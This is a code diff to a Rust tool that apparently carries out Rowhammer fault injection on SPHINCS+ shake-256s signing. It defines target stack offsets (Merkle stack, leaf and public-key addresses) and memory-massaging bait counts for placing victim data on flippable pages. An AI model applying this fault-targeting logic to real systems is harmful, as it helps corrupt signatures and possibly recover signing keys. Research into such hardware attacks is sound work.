@@ -99,7 +99,7 @@ const SIGS_FILE: &str = "sigs.txt";
 // find profile entry with bitflips in needed range
 #[derive(Clone, Debug, Serialize)]
 struct TargetOffset {
-    description: String,
+    description: &'static str,
     page_offset: usize,
     stack_offset: usize,
     target_size: usize,
@@ -121,57 +121,40 @@ fn filter_addrs(addrs: Vec<usize>, targets: &[TargetOffset]) -> Vec<(usize, Targ
         .collect_vec()
 }
 
+const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
+    description: "any",
+    page_offset: 0,
+    stack_offset: 31,
+    target_size: 0x1000,
+}];
+
+// Target offsets for shake-256s WITH memutils printing enabled
+const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 3] = [
+    TargetOffset {
+        description: "stack merkle",
+        page_offset: 0x970,
+        stack_offset: 31,
+        target_size: 256,
+    },
+    TargetOffset {
+        description: "leaf_addr",
+        page_offset: 0xbb8,
+        stack_offset: 31,
+        target_size: 22,
+    },
+    TargetOffset {
+        description: "pk_addr",
+        page_offset: 0xbd8,
+        stack_offset: 31,
+        target_size: 22,
+    },
+];
+
 fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
-    let targets = [
-        // attack root[SPX_N] for 256s
-        TargetOffset {
-            description: "root[SPX_N] 256s".to_string(),
-            page_offset: 0xec0,
-            stack_offset: 31,
-            target_size: 32,
-        },
-        // attack stack for 256s
-        TargetOffset {
-            description: "stack 256s".to_string(),
-            page_offset: 0x700,
-            stack_offset: 31,
-            target_size: 448,
-        },
-        // attack stack for 256s
-        TargetOffset {
-            description: "stack 256s".to_string(),
-            page_offset: 0xa10,
-            stack_offset: 31,
-            target_size: 256,
-        },
-        // attack leaf_addr (22 byte) for 256s
-        TargetOffset {
-            description: "leaf_addr 256s".to_string(),
-            page_offset: 0xc68,
-            stack_offset: 31,
-            target_size: 22,
-        },
-        // attack pk_addr (22 byte) for 256s
-        TargetOffset {
-            description: "pk_addr 256s".to_string(),
-            page_offset: 0xc48,
-            stack_offset: 31,
-            target_size: 22,
-        },
-    ];
     // the number of bait pages to release after the target page (for memory massaging)
     let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
 
-    // just put the page at offset 31
-    Some(InjectionConfig {
-        target_addr: addrs.first().copied().unwrap(),
-        flippy_page_size: PAGE_SIZE,
-        bait_count_after: bait_count_after.get(&31).copied().unwrap(),
-        bait_count_before: 0,
-        stack_offset: 31,
-    })
-    /*
-    filter_addrs(addrs, &targets)
+    filter_addrs(addrs, &TARGET_OFFSETS_SHAKE_256S)
         .first()
         .map(|f| InjectionConfig {
             target_addr: f.0,
@@ -182,7 +165,7 @@ fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
                 .expect("unsupported stack offset"),
             bait_count_before: 0,
             stack_offset: f.1.stack_offset,
-        })*/
+        })
 }
 
 impl SphincsPlus {
@@ -494,7 +477,7 @@ mod tests {
     fn test_filter_addrs_match_start() {
         let addrs = vec![0x700];
         let targets = [TargetOffset {
-            description: "test_filter_flips_match_start".to_string(),
+            description: "test_filter_flips_match_start",
             page_offset: 0x700,
             stack_offset: 31,
             target_size: 32,
@@ -507,7 +490,7 @@ mod tests {
     fn test_filter_addrs_match_end() {
         let addrs = vec![0x700];
         let target = TargetOffset {
-            description: "test_filter_flips_match_end".to_string(),
+            description: "test_filter_flips_match_end",
             page_offset: 0x600,
             stack_offset: 31,
             target_size: 0x101,
@@ -520,7 +503,7 @@ mod tests {
     fn test_filter_addrs_nomatch() {
         let addrs = vec![0x700];
         let target = TargetOffset {
-            description: "test_filter_flips_nomatch".to_string(),
+            description: "test_filter_flips_nomatch",
             page_offset: 0x600,
             stack_offset: 31,
             target_size: 0x100,
